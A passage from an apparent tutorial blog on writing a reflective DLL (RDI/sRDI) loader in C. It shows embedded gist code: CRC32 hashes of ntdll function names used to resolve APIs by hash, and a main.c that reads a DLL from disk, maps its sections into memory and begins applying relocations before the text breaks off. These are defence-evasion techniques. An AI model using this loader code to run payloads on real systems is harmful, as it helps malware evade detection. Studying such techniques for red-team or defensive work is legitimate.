          <td id="file-peb-h-LC16" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtFreeVirtualMemory_CRC32b</span>          <span class="pl-c1">0xf29625d3</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-peb-h-LC17" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtProtectVirtualMemory_CRC32b</span>       <span class="pl-c1">0x357d60b3</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-peb-h-LC18" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtFlushInstructionCache_CRC32b</span>      <span class="pl-c1">0xc5f7ca5e</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-peb-h-LC19" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtQueryInformationFile_CRC32b</span>       <span class="pl-c1">0xb54956cb</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-peb-h-LC20" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-peb-h-LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-k">extern</span> <span class="pl-k">void</span> *<span class="pl-en">get_ntdll</span>();</td>
        </tr>
        <tr>
          <td id="file-peb-h-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-peb-h-LC22" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-peb-h-LC23" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> <span class="pl-en">crc32b</span>(<span class="pl-k">const</span> <span class="pl-c1">uint8_t</span> *str);</td>
        </tr>
        <tr>
          <td id="file-peb-h-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-peb-h-LC24" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-peb-h-LC25" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">get_proc_address_by_hash</span>(<span class="pl-k">void</span> *dll_address, <span class="pl-c1">uint32_t</span> function_hash);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/34f2b25417a2c1d18f92a7549aab88c8/raw/2c3bd2bcd7ef77469c330b4ea1a31af962d59317/peb.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/34f2b25417a2c1d18f92a7549aab88c8#file-peb-h">
          peb.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><code>main.c</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/f7e195df8baddbf872090c2a4e34352c.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814540" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-main-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="main.c">
        <tbody><tr>
          <td id="file-main-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-main-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-main-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-main-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>peb.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-main-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-main-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-main-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>() {</td>
        </tr>
        <tr>
          <td id="file-main-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-main-c-LC5" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-main-c-LC6" class="blob-code blob-code-inner js-file-line">    NTSTATUS status;</td>
        </tr>
        <tr>
          <td id="file-main-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-main-c-LC7" class="blob-code blob-code-inner js-file-line">    UNICODE_STRING dll_file;</td>
        </tr>
        <tr>
          <td id="file-main-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-main-c-LC8" class="blob-code blob-code-inner js-file-line">    WCHAR w_file_path[<span class="pl-c1">100</span>] = L<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>??<span class="pl-cce">\\\\</span>C:<span class="pl-cce">\\</span>Temp<span class="pl-cce">\\</span>dll_poc.dll<span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-main-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_ntdll = <span class="pl-c1">get_ntdll</span>();</td>
        </tr>
        <tr>
          <td id="file-main-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-main-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_rtl_init_unicode_string = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, RtlInitUnicodeString_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-main-c-LC11" class="blob-code blob-code-inner js-file-line">    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;</td>
        </tr>
        <tr>
          <td id="file-main-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-main-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_rtl_init_unicode_string</span>(&amp;dll_file, w_file_path);</td>
        </tr>
        <tr>
          <td id="file-main-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-main-c-LC13" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-main-c-LC14" class="blob-code blob-code-inner js-file-line">    OBJECT_ATTRIBUTES obj_attrs;</td>
        </tr>
        <tr>
          <td id="file-main-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-main-c-LC15" class="blob-code blob-code-inner js-file-line">    IO_STATUS_BLOCK io_status_block;</td>
        </tr>
        <tr>
          <td id="file-main-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-main-c-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">InitializeObjectAttributes</span>(&amp;obj_attrs, &amp;dll_file, OBJ_CASE_INSENSITIVE, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-main-c-LC17" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-main-c-LC18" class="blob-code blob-code-inner js-file-line">    HANDLE h_file = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-main-c-LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_create_file = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtCreateFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-main-c-LC20" class="blob-code blob-code-inner js-file-line">    NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;</td>
        </tr>
        <tr>
          <td id="file-main-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-main-c-LC21" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_create_file</span>(&amp;h_file, SYNCHRONIZE | GENERIC_READ, &amp;obj_attrs, &amp;io_status_block, <span class="pl-c1">0</span>, <span class="pl-c1">0x0000080</span>, <span class="pl-c1">0x0000007</span>, FILE_OPEN_IF, <span class="pl-c1">0x0000020</span>, <span class="pl-c1">0x0000000</span>, <span class="pl-c1">0</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-main-c-LC22" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-main-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-main-c-LC24" class="blob-code blob-code-inner js-file-line">    FILE_STANDARD_INFORMATION file_standard_info;</td>
        </tr>
        <tr>
          <td id="file-main-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-main-c-LC25" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_query_information_file = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtQueryInformationFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-main-c-LC26" class="blob-code blob-code-inner js-file-line">    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;</td>
        </tr>
        <tr>
          <td id="file-main-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-main-c-LC27" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_query_information_file</span>(h_file, &amp;io_status_block, &amp;file_standard_info, <span class="pl-k">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-main-c-LC28" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-main-c-LC29" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-main-c-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> dll_size = file_standard_info.<span class="pl-smi">EndOfFile</span>.<span class="pl-smi">QuadPart</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-main-c-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *dll_bytes = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-main-c-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_allocate_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtAllocateVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-main-c-LC33" class="blob-code blob-code-inner js-file-line">    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-main-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-main-c-LC34" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_allocate_virtual_memory</span>(((HANDLE) -<span class="pl-c1">1</span>), &amp;dll_bytes, <span class="pl-c1">0</span>, &amp;dll_size, MEM_COMMIT, PAGE_READWRITE)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-main-c-LC35" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">3</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-main-c-LC36" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-main-c-LC37" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_read_file = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtReadFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-main-c-LC38" class="blob-code blob-code-inner js-file-line">    NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;</td>
        </tr>
        <tr>
          <td id="file-main-c-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-main-c-LC39" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_read_file</span>(h_file, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, &amp;io_status_block, dll_bytes, dll_size, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-main-c-LC40" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-main-c-LC41" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-main-c-LC42" class="blob-code blob-code-inner js-file-line">    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;</td>
        </tr>
        <tr>
          <td id="file-main-c-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-main-c-LC43" class="blob-code blob-code-inner js-file-line">    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + dos_header-&gt;<span class="pl-smi">e_lfanew</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-main-c-LC44" class="blob-code blob-code-inner js-file-line">    SIZE_T dll_image_size = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfImage</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-main-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-main-c-LC46" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *dll_base = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-main-c-LC47" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_allocate_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), &amp;dll_base, <span class="pl-c1">0</span>, &amp;dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-main-c-LC48" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-main-c-LC49" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-main-c-LC50" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> delta_image_base = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base - (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">ImageBase</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-main-c-LC51" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(dll_base, dll_bytes, nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfHeaders</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-main-c-LC52" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-main-c-LC53" class="blob-code blob-code-inner js-file-line">    PIMAGE_SECTION_HEADER section = <span class="pl-c1">IMAGE_FIRST_SECTION</span>(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-main-c-L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-main-c-LC54" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span>(<span class="pl-c1">size_t</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; i++) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-main-c-LC55" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *section_destination = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-main-c-LC56" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *section_bytes = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">PointerToRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-main-c-LC57" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(section_destination, section_bytes, section-&gt;<span class="pl-smi">SizeOfRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-main-c-LC58" class="blob-code blob-code-inner js-file-line">        section++;</td>
        </tr>
        <tr>
          <td id="file-main-c-L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-main-c-LC59" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-main-c-LC60" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-main-c-LC61" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY relocations = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_BASERELOC];</td>
        </tr>
        <tr>
          <td id="file-main-c-L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-main-c-LC62" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_table = relocations.<span class="pl-smi">VirtualAddress</span> + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base;</td>
        </tr>
        <tr>
          <td id="file-main-c-L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-main-c-LC63" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_processed = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-main-c-LC64" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-main-c-LC65" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(relocations_processed &lt; relocations.<span class="pl-smi">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-main-c-LC66" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-main-c-L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-main-c-LC67" class="blob-code blob-code-inner js-file-line">        relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK);</td>
        </tr>
        <tr>
          <td id="file-main-c-L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-main-c-LC68" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_count = (relocation_block-&gt;<span class="pl-smi">BlockSize</span> - <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK)) / <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-main-c-L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-main-c-LC69" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-main-c-L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-main-c-LC70" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-main-c-LC71" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> i = <span class="pl-c1">0</span>; i &lt; relocations_count; i++) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-main-c-LC72" class="blob-code blob-code-inner js-file-line">            relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-main-c-L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-main-c-LC73" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>(relocation_entries[i].<span class="pl-smi">Type</span> == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="file-main-c-LC74" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">continue</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-main-c-LC75" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-main-c-LC76" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_rva = relocation_block-&gt;<span class="pl-smi">PageAddress</span> + relocation_entries[i].<span class="pl-smi">Offset</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-main-c-LC77" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> address_to_patch = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
